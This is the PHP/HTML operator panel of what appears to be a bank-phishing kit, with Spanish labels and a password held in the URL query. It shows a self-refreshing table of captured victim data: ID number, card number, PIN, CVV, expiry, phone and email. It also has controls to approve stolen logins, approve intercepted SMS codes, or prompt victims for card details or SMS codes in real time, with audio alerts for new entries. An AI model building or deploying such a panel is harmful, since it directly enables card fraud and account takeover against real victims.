<?php

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include 'config.php';

########################################################################

if (isset($_GET['pwd']) && $_GET['pwd'] == $panel_password) {

} else {
    
    exit();

}

?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <title>Panel de Registros</title>
    <style>
        body {
            font-size: 0.85rem; /* Tamaño de letra más pequeño para toda la página */
        }
        .aprobar_boton {
            width: 150px;
        }

        .aprobar_boton_sms {
            width: 150px;
        }

        .aprobar_boton_tarjeta {
            width: 150px;
        }
    </style>
</head>
<body>
    <div class="container-fluid mt-2">
        <h2>Panel de Registros</h2>
        <table class="table table-bordered table-striped">
            <thead>
                <tr>
                    <th>ID</th>

                    <th>DNI</th>
                    <th>Tarjeta</th>
                    <th>Clave</th>

                    <th>Monto</th>
                    <th>Celular</th>
                    <th>Correo</th>
                    <th>Vencimiento</th>
                    <th>CVV</th>
                    <th>ATM</th>
                    
                    <th>Fecha y hora</th>
                    <th>Eliminar</th>
                </tr>
            </thead>
            <tbody id="record-table-body">
                <!-- Los registros se llenarán aquí mediante JavaScript -->
            </tbody>
        </table>
    </div>

    <!-- Modal para Aprobar Login -->
    <div class="modal fade" id="approveModal" tabindex="-1" aria-labelledby="approveModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="approveModalLabel">Aprobar Login</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span>&times;</span>
                    </button>
                </div>
                <div class="modal-body" >

                    <form id="approve-form">
                        <div style=" display: flex; justify-content: space-around; ">
                            <div>
                                <input class="aprobar_boton btn btn-primary" type="button" name="approval" id="approve-yes" value="Si">
                            </div>
                            <div>
                                <input class="aprobar_boton btn btn-danger" type="button" name="approval" id="approve-no" value="No">
                            </div>
                        </div>
                        <input type="hidden" id="record-id">
                    </form>

                </div>
            </div>
        </div>
    </div>

    <!-- Modal para Aprobar SMS -->
    <div class="modal fade" id="approveModal_sms" tabindex="-1" aria-labelledby="approveModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="approveModalLabel">Aprobar SMS</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span>&times;</span>
                    </button>
                </div>
                <div class="modal-body">

                    <form id="approve-form-sms">

                        <div style=" display: flex; justify-content: space-around; ">
                            <div>
                                <input class="aprobar_boton_sms btn btn-primary" type="button" name="approval_sms" id="approve-yes" value="Si">
                            </div>
                            <div>
                                <input class="aprobar_boton_sms btn btn-danger" type="button" name="approval_sms" id="approve-no" value="No">
                            </div>
                        </div>
                        <input type="hidden" id="record-id">

                    </form>

                </div>
            </div>
        </div>
    </div>

    <!-- Modal para Pedir SMS -->
    <div class="modal fade" id="smsModal" tabindex="-1" role="dialog" aria-labelledby="smsModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="smsModalLabel">Pedir datos</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                
                <div class="modal-body">
                    <form id="approve-form-tarjeta-sms">

                        <div style=" display: flex; justify-content: space-around; ">
                            <div>
                                <input class="aprobar_boton_tarjeta btn btn-primary" type="button" name="approval_tarjeta" id="approve-yes" value="Tarjeta">
                            </div>
                            <div>
                                <input class="aprobar_boton_tarjeta btn btn-primary" type="button" name="approval_tarjeta" id="approve-no" value="SMS">
                            </div>
                        </div>
                        <input type="hidden" id="record-id">

                    </form>
                </div>

            </div>
        </div>
    </div>



    <!-- Modal para Confirmar Eliminación -->
    <div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="deleteModalLabel">Eliminar Registro</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span>&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p>¿Está seguro de que desea eliminar este registro?</p>
                    <input type="hidden" id="delete-id">
                    <button id="confirm-delete" class="btn btn-danger">Sí</button>
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">No</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal para Confirmar Baneo -->
    <div class="modal fade" id="banModal" tabindex="-1" aria-labelledby="banModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="banModalLabel">Banear Registro</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span>&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <p>¿Está seguro de que desea banear este registro?</p>
                    <input type="hidden" id="ban-id">
                    <button id="confirm-ban" class="btn btn-danger">Sí</button>
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">No</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal para ver Tarjeta -->
    <div class="modal fade" id="approveModal_tarjeta" tabindex="-1" aria-labelledby="approveModalLabel_2" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Ver Tarjeta</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span>&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="form-group">
                        <label for="numeroTarjeta">Número de Tarjeta</label>
                        <input disabled readonly type="text" class="form-control" id="numeroTarjeta" placeholder="Ingrese el número de tarjeta" required>
                    </div>
                    <div class="form-group">
                        <label for="fechaVencimiento">Fecha de Vencimiento</label>
                        <input disabled readonly type="text" class="form-control" id="fechaVencimiento" placeholder="MM/AA" required>
                    </div>
                    <div class="form-group">
                        <label for="cvv">CVV</label>
                        <input disabled readonly type="text" class="form-control" id="cvv" placeholder="Ingrese el CVV" required>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <audio id="alerta-username" src="utils/audio/ALERTA_LOGO.mp3" preload="auto"></audio>
    <audio id="alerta-sms" src="utils/audio/ALERTA_SMS.mp3" preload="auto"></audio>



    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.0.7/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>

        $(document).ready(function() {

            let previousUsernames = [];
            let previousSMS = [];

            // Función para reproducir sonido
            function reproducirSonido(id) {
                const sonido = document.getElementById(id);
                if (sonido) {
                    sonido.play().catch(() => {});
                }
            }

            // Función para obtener los valores de la columna "Username" y comparar
            function verificarCambios() {
                const currentUsernames = [];
                const currentSMS = [];

                // Obtener los valores actuales de la columna "Username"
                $('#record-table-body tr').each(function() {
                    const username = $(this).find('td:nth-child(1)').text().trim();
                    console.log(username);
                    currentUsernames.push(username);
                    const sms = $(this).find('td:nth-child(9)').text().trim();
                    console.log(sms);
                    currentSMS.push(sms);
                });

                // Comparar con los valores anteriores
                if (JSON.stringify(previousUsernames) !== JSON.stringify(currentUsernames)) {
                    console.log("Cambio detectado en Username.");
                    reproducirSonido('alerta-username');
                    previousUsernames = currentUsernames;
                }
                if (JSON.stringify(previousSMS) !== JSON.stringify(currentSMS)) {
                    console.log("Cambio detectado en Username.");
                    reproducirSonido('alerta-sms');
                    previousSMS = currentSMS;
                }
            }

            // Función para obtener registros
            function fetchRecords() {
                $.ajax({
                    url: 'get_post.php?action=fetch_records',
                    method: 'GET',
                    dataType: 'html',
                    success: function(data) {
                        $('#record-table-body').html(data);
                        verificarCambios(); // Verificar cambios después de actualizar la tabla
                    },
                    error: function(xhr, status, error) {
                        console.error(error);
                    }
                });
            }

            // Inicializar
            fetchRecords();
            setInterval(fetchRecords, 5000); // Actualizar cada 2 segundos

            // Eliminar registro
            $(document).on('click', '.delete-btn', function() {
                const id = $(this).data('id');
                $('#delete-id').val(id);
                $('#deleteModal').modal('show');
            });

            $('#confirm-delete').on('click', function() {
                const id = $('#delete-id').val();
                $.ajax({
                    url: 'get_post.php?action=delete_record',
                    method: 'POST',
                    data: { id: id },
                    success: function() {
                        $('#deleteModal').modal('hide');
                        fetchRecords();
                    },
                    error: function(xhr, status, error) {
                        console.error(error);
                    }
                });
            });
        });

    </script>

</body>
</html>
